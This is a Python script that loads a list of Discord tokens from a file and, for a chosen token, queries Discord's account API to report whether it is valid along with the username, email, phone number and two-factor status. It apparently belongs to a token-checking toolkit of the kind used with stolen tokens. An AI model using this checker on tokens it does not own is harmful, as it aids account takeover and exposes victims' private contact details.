import os
import requests
import time
from datetime import datetime, timezone
from colorama import init, Fore, Style

# Initialize colorama for color styling
init()

banner = """
██╗███╗   ██╗███████╗ ██████╗ 
██║████╗  ██║██╔════╝██╔═══██╗
██║██╔██╗ ██║█████╗  ██║   ██║
██║██║╚██╗██║██╔══╝  ██║   ██║
██║██║ ╚████║██║     ╚██████╔╝
╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ 
                              
"""

def print_with_delay(text, delay=0.05):
    lines = text.splitlines()
    for line in lines:
        print(line)
        time.sleep(delay)

# Function to list tokens from the file
def list_tokens():
    token_file_path = "Input/Token-List/token_list.txt"
    if not os.path.exists(token_file_path):
        print(Fore.RED + "[ERROR] Token file not found!" + Style.RESET_ALL)
        return []

    with open(token_file_path, "r") as file:
        tokens = [line.strip() for line in file if line.strip()]
    
    if not tokens:
        print(Fore.RED + "[ERROR] No tokens found in the token file." + Style.RESET_ALL)
        return []
    
    print(Fore.CYAN + "Choose a token from the following:" + Style.RESET_ALL)
    for i, token in enumerate(tokens, start=1):
        print(Fore.LIGHTGREEN_EX + f"{i}. {token}" + Style.RESET_ALL)
    
    return tokens

# Function to select a token from the list
def select_token(tokens):
    try:
        token_choice = int(input(Fore.BLUE + "Enter the number corresponding to the token you want to use: " + Style.RESET_ALL)) - 1
        if token_choice < 0 or token_choice >= len(tokens):
            print(Fore.RED + "[ERROR] Invalid choice. Please choose a valid token." + Style.RESET_ALL)
            return None
        return tokens[token_choice]
    except ValueError:
        print(Fore.RED + "[ERROR] Invalid input. Please enter a number." + Style.RESET_ALL)
        return None

def token_info(token_discord):
    try:
        api = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token_discord}).json()
        response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token_discord, 'Content-Type': 'application/json'})
        status = "Valid" if response.status_code == 200 else "Invalid"

        username_discord = api.get('username', "None") + '#' + api.get('discriminator', "None")
        display_name_discord = api.get('global_name', "None")
        user_id_discord = api.get('id', "None")
        email_discord = api.get('email', "None")
        email_verified_discord = api.get('verified', "None")
        phone_discord = api.get('phone', "None")
        mfa_discord = api.get('mfa_enabled', "None")
        country_discord = api.get('locale', "None")

        created_at_discord = datetime.fromtimestamp(((int(api.get('id', 'None')) >> 22) + 1420070400000) / 1000, timezone.utc) if api.get('id') else "None"

        print(f"""
\033[31m[INFO] Status       : {status}
[INFO] Token        : {token_discord}
[INFO] Username     : {username_discord}
[INFO] Display Name : {display_name_discord}
[INFO] Id           : {user_id_discord}
[INFO] Created      : {created_at_discord}
[INFO] Country      : {country_discord}
[INFO] Email        : {email_discord}
[INFO] Verified     : {email_verified_discord}
[INFO] Phone        : {phone_discord}
[INFO] Multi-Factor Authentication : {mfa_discord}
\033[0m""")
    except Exception as e:
        print(f"\033[31m[ERROR] Error when retrieving information: {e}\033[0m")

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print_with_delay(Fore.LIGHTBLUE_EX + banner, delay=0.05)

    tokens = list_tokens()
    if tokens:
        selected_token = select_token(tokens)
        if selected_token:
            token_info(selected_token)

if __name__ == "__main__":
    main()
    